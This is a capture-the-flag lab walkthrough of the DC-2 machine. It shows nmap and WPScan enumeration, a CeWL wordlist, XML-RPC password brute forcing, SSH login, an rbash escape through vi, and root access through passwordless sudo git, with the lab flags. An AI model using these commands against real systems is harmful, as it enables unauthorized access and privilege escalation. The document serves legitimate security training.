---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Enumeration
### NMAP scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -T5 -Pn -A -p- 192.168.240.194
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-01 18:07 IST
Warning: 192.168.240.194 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.240.194
Host is up (0.066s latency).
Not shown: 65163 closed tcp ports (conn-refused), 370 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 496.81 seconds
```

There are two open ports:

| Port | Service |
| ---- | ------- |
| 80   | http    |
| 7744 | ssh     |

Let's visit port 80 through our browser.

![1](https://github.com/Kunull/Write-ups/assets/110326359/5b99ab0a-fc90-418e-886e-71790a5ffdd2)

We have to map `192.168.240.194` to `dc-2` in our `/etc/hosts` file.

![2](https://github.com/Kunull/Write-ups/assets/110326359/752bbe0f-c83a-4ff0-a4cc-ef3f3f742787)

As we can see, there is a WordPress site running on port 80.

### User enumeration using WPScan

We can gather more information using the `wpscan` utility.

```
$ wpscan --url http://dc-2 --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://dc-2/ [192.168.240.194]
[+] Started: Wed May  1 19:07:18 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.6
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

// highlight-next-line
[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed May  1 19:07:32 2024
[+] Requests Done: 74
[+] Cached Requests: 6
[+] Data Sent: 16.619 KB
[+] Data Received: 21.551 MB
[+] Memory used: 213.875 MB
[+] Elapsed time: 00:00:14
```

We managed to find three users

| Users |
| ----- |
| admin |
| tom   |
| jerry |

Let's save these usernames in the `users.txt` file.

### Generating passwords using cewl

Now, we can use the `cewl` utility to generate password list for the users we found.

```
$ cewl http://dc-2/ -w passwords.txt
```

&nbsp;

## Exploitation

### Brute forcing credentials using WPScan

Again, using the `wpscan` utility we can brute force the login.

```
$ wpscan --url http://dc-2 -U user.txt -P passwords.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://dc-2/ [192.168.240.194]
[+] Started: Wed May  1 19:18:18 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.6
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                                                                                                                                                                              
[SUCCESS] - tom / parturient                                                                                                                                                                                                                
Trying admin / log Time: 00:01:05 <==============================================================================================                                                                       > (646 / 1121) 57.62%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed May  1 19:19:40 2024
[+] Requests Done: 817
[+] Cached Requests: 7
[+] Data Sent: 363.188 KB
[+] Data Received: 746.756 KB
[+] Memory used: 255.133 MB
[+] Elapsed time: 00:01:21
```

We have found the following credentials.

| Username | Password   |
| -------- | ---------- |
| jerry    | adipiscing |
| tom      | parturient |

### Logging in through SSH

Since we know that there is an SSH service running on the target, we can use the credentials we have to login.

```
$ ssh tom@192.168.240.194 -p 7744
tom@192.168.240.194's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ 
```

&nbsp;

## Post Exploitation
### Escaping restricted shell

Once we obtain a foothold on the target, we quickly realize that most commands are not allowed.

```
tom@DC-2:~$ cat
-rbash: cat: command not found
tom@DC-2:~$ sudo
-rbash: sudo: command not found
tom@DC-2:~$ cd
-rbash: cd: restricted
```

Let's find out which commands are allowed by listing out the `/home/tom/usr/bin` directory.

```
tom@DC-2:~$ ls /home/tom/usr/bin
less  ls  scp  vi
```

There is a way to escape restricted shell using the `vi` command.

We can find the payload on [GTFOBins](https://gtfobins.github.io).

![4](https://github.com/Kunull/Write-ups/assets/110326359/9af8dee2-32b0-47f0-9108-59b1b5cfedad)

Because we want a Bash shell, we will have to modify the payload slightly.

```
vi
:set shell=/bin/bash
:shell
```

Let's execute the payload.

```
tom@DC-2:~$ vi

tom@DC-2:~$
```

Now, let's export the `PATH` in the environment.

```
tom@DC-2:~$ export PATH=/bin:/usr/bin:$PATH
tom@DC-2:~$ export SHELL=/bin/bash:$SHELL
```

### local.txt

We can now `cat` the `local.txt` flag.

```
tom@DC-2:~$ cat local.txt
a5af626ceea9f79c26034c91502946ce
```

### Switching to the jerry user

Let's switch to the user `jerry` using the `su` command.

```
tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ 
```

### Privilege Escalation

Let's check what commands `jerry` can run with `root` privileges without needing a password.

```
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

We can  use this misconfigured SUID bit to escalaet our privileges.

We can find the this payload on [GTFOBins](https://gtfobins.github.io) as well.

![3](https://github.com/Kunull/Write-ups/assets/110326359/de7e39b6-c6a4-4235-b7b6-3930c18fb997)

If we use the second payload, we get a `root` shell.

```
root@DC-2:/home/jerry# whoami
root
```

We are now the `root` user.

### proof.txt

We can now `cat` the `proof.txt` flag.

```
root@DC-2:~# cat proof.txt
95e76ef1154a293d3cfcf606748f6f6d
```
